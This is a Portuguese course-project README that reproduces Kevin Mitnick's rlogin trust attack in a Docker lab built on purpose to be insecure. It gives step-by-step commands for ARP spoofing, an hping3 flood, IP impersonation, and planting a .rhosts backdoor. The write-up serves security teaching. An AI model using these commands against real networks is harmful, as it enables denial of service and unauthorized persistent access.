# Mitnick Attack

## **Requisitos**

- docker
- docker compose

## **Contexto**

Este é o trabalho para a disciplina de Segurança Computacional da Universidade Federal do Paraná. O objetivo é reproduzir o ataque de Kevin Mitnick e demonstrar que é possível obter acesso a uma rede interna sem a necessidade de um ataque de força bruta.

***

## [Entendendo o ataque de Mitnick](https://seedsecuritylabs.org/Labs_16.04/PDF/Mitnick_Attack.pdf)

Basta seguir o link acima.

***

## **Entendendo nossa versão do ataque**

### **estrutura geral**

Nossa topologia consistirá de 3 containers docker:

1. [attacker](./docker-compose.yml#L29)
2. [trusted_server](./docker-compose.yml#L17)
3. [x-terminal](./docker-compose.yml#L5)

É possível verificar a topologia no arquivo [docker-compose.yml](./docker-compose.yml).

```yaml
version: '3.5'

services:
  # attacker, x-terminal and trusted-server are in the same network
  xterminal:
    build:
      context: .
      target: xterminal
    container_name: x-terminal
    hostname: x-terminal
    networks:
      my-network:
        ipv4_address: 172.28.1.2
    cap_add:
      - NET_ADMIN

  trusted-server:
    build:
      context: .
      target: trusted-server
    container_name: trusted-server
    hostname: trusted-server
    networks:
      my-network:
        ipv4_address: 172.28.1.3
    cap_add:
      - NET_ADMIN

  attacker:
    build:
      context: .
      target: attacker
    container_name: attacker
    hostname: attacker
    networks:
      my-network:
        ipv4_address: 172.28.1.4
    cap_add:
      - NET_ADMIN

networks:
  my-network:
    driver: bridge
    ipam:
      driver: default
      config:
        - subnet: 172.28.1.0/24
```

Os três containers estão na mesma rede e conseguem se enxergar. Entretanto, existe uma relação de confiança entre o trusted_server e o x-terminal. O x-terminal é um terminal que só pode ser acessado, sem a necessidade de senha, a partir do trusted_server.

Para gerar cada uma das máquinas, foi utilizado um Dockerfile com multi-stage build.

```dockerfile
FROM ubuntu:18.04 as base

RUN apt update && apt-get install -y \
    rsh-client \
    rsh-server \
    net-tools \
    iputils-ping \
    tcpdump \
    && rm -rf /var/lib/apt/lists/*

# Stage 1: Trusted-server
FROM base as trusted-server
RUN apt-get update && apt-get install -y \
    inetutils-inetd \
    iproute2 \
    && rm -rf /var/lib/apt/lists/*

# Setting host inside /etc/hosts
CMD echo '172.28.1.2 x-terminal' >> /etc/hosts

# Keep container running
ENTRYPOINT /etc/init.d/inetutils-inetd start && tc qdisc add dev eth0 root tbf rate 800bit burst 1kbit latency 400ms && tail -f /dev/null


# Stage 2: xterminal
FROM base as xterminal

RUN apt-get update && apt-get install -y \
    inetutils-inetd \
    && rm -rf /var/lib/apt/lists/*

# Creating user fontoura
RUN useradd -m fontoura
# Setting password for user fontoura
RUN echo 'fontoura:fontoura' | chpasswd
# Setting trusted-server IP inside /etc/hosts
CMD echo '172.28.1.3 trusted-server' >> /etc/hosts
# Enabling only fontoura to login without password as root from trusted-server
RUN echo 'trusted-server fontoura' >> /etc/hosts.equiv
RUN echo 'trusted-server root' >> /home/fontoura/.rhosts

# Keep container running
ENTRYPOINT /etc/init.d/inetutils-inetd start && tail -f /dev/null


# Stage 3: Attacker
FROM base as attacker
# Set DEBIAN_FRONTEND to noninteractive
ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    hping3 \
    dsniff \
    && rm -rf /var/lib/apt/lists/*

# Keep container running
CMD echo '172.28.1.2 x-terminal' >> /etc/hosts && ifconfig eth0 promisc && tail -f /dev/null
```

Para facilitar a simulação do ataque, a **interface de rede do trusted-server foi limitada a 800 bits por segundo**. Isso simula uma interface de rede lenta e sucetível a ataques de negação de serviço.

O sistema de acesso remoto será feito usando rlogin.

### **x-terminal**

A máquina x-terminal possui um usuário chamado "fontoura" com senha "fontoura".

### **attacker**

A máquina attacker é uma máquina que está tentando acessar o x-terminal. Ela não tem acesso direto ao x-terminal mas tem acesso a rede interna.

### **trusted_server**

A máquina trusted_server é uma máquina que tem acesso direto ao x-terminal. Ela é a única máquina que pode acessar o x-terminal.

A largura de banda do trusted_server é limitada, para simular uma interface de rede lenta e sucetível a ataques de negação de serviço.

### **Ataque**

O ataque será feito em 5 etapas:

1. **Arp Spoofing**
2. **Negação de serviço**
3. **Personificação**
4. **Invasão**
5. **Backdoor**

Cada etapa será abordada em detalhes a seguir.

***

## **Como executar**

1. **Iniciando as máquinas**

    ```bash
    docker-compose up -d
    ```

2. **Acessando as máquinas**

    Para acessar cada uma das máquinas. Em três terminais diferentes, execute os seguintes comandos, um em cada terminal:

    ```bash
    docker exec -it trusted_server bash
    docker exec -it attacker bash
    docker exec -it victim bash
    ```

    Para explorar a relação de confiança entre o trusted_server e o x-terminal, execute o seguinte comando no **terminal do trusted_server:**

    ```bash
    rlogin -l fontoura x-terminal
    ```

    Isso fará com que o usuário fontoura seja logado no x-terminal sem a necessidade de uma senha.

    Agora, para verificar que o x-terminal não pode ser acessado por outras máquinas, execute o seguinte comando no **terminal do attacker:**

    ```bash
    rlogin -l fontoura x-terminal
    ```

    O comando acima tentará realizar o login no x-terminal. Como o attacker não é o trusted_server, o login necessitará de uma senha.

    **Obs.:** Em alguns cenários o docker manipula o iptables da máquina host. Caso sua politica de FORWARD esteja DROP, execute: `sudo iptables -P FORWARD ACCEPT`.

    Para verificar a politica de FORWARD, execute: `sudo iptables -L FORWARD`.

3. **Realizando o arp spoofing**

    Para realizar o arp spoofing, execute o seguinte comando no **terminal do attacker:**

    ```bash
    arpspoof -i eth0 -t 172.28.1.2 172.28.1.3
    ```

    O comando acima faz com que o attacker se passe pelo trusted_server para o x-terminal. Envenenando a tabela arp do x-terminal.

    É possível verificar que o arp spoofing foi realizado com sucesso executando o seguinte comando no **terminal do x-terminal**:

    ```bash
    arp -a
    ```

    Podemos ver que o trusted-server está na tabela arp do x-terminal com o endereço MAC do attacker.

4. **Realizando a negação de serviço**

    Para realizar a negação de serviço, execute o seguinte comando no **terminal do attacker:**

    ```bash
    hping3 --flood --rand-source 172.28.1.3
    ```

    O comando fará um flood de pacotes no trusted_server. O objetivo é saturar a largura de banda do trusted_server, fazendo com que ele não consiga mais responder as requisições do x-terminal ou se comunicar com a rede.

5. **Realizando a personificação**

    Para realizar a personificação, iremos mudar o IP do attacker para o IP do trusted_server. Para isso, execute o seguinte comando no **terminal do attacker:**

    ```bash
    ifconfig eth0 172.28.1.3
    ```

    Agora, o attacker está se passando pelo trusted_server para o x-terminal.

6. **Invadindo**

    Para verificar que a personificação foi realizada com sucesso, podemos tentar realizar o login sem senha em x-terminal. A partir do attacker, execute o seguinte comando:

    ```bash
    rlogin -l fontoura x-terminal
    ```

    O comando acima tentará realizar o login no x-terminal. Como o attacker está se passando pelo trusted_server, o login será realizado com sucesso e o usuário fontoura será logado no x-terminal sem a necessidade de uma senha.

7. **configurando o backdoor**

    Para abrir a conexão através do rlogin ao x-terminal para o attacker, execute o seguinte comando no **terminal do x-terminal**:

    ```bash
    echo '172.28.1.4 root' >> /home/fontoura/.rhosts
    ```

    Isso permitirá que o attacker se logue no x-terminal sem a necessidade de uma senha.

8. **Conclusão**

    Com o backdoor configurado, podemos retornar o IP do attacker para o seu IP original. Para isso, execute o seguinte comando no **terminal do attacker:**

    ```bash
    ifconfig eth0 172.28.1.4
    ```

    Para verificar que o backdoor está funcionando, execute o seguinte comando no **terminal do attacker:**

    ```bash
    rlogin -l fontoura x-terminal
    ```

    Se o backdoor estiver funcionando, o usuário fontoura será logado no x-terminal sem a necessidade de uma senha.

    Para conferir que os pacotes não estão passando pelo trusted_server, execute o seguinte comando no **terminal do attacker:**

    ```bash
    tcpdump -i eth0 tcp port 513
    ```

    O comando acima irá capturar os pacotes que estão sendo enviados para o x-terminal. Como o attacker está se passando pelo trusted_server, os pacotes não devem passar pelo trusted_server.

***

## Autores

- Guiusepe Oneda - GRR20210572
- Vinícius Fontoura - GRR20206873
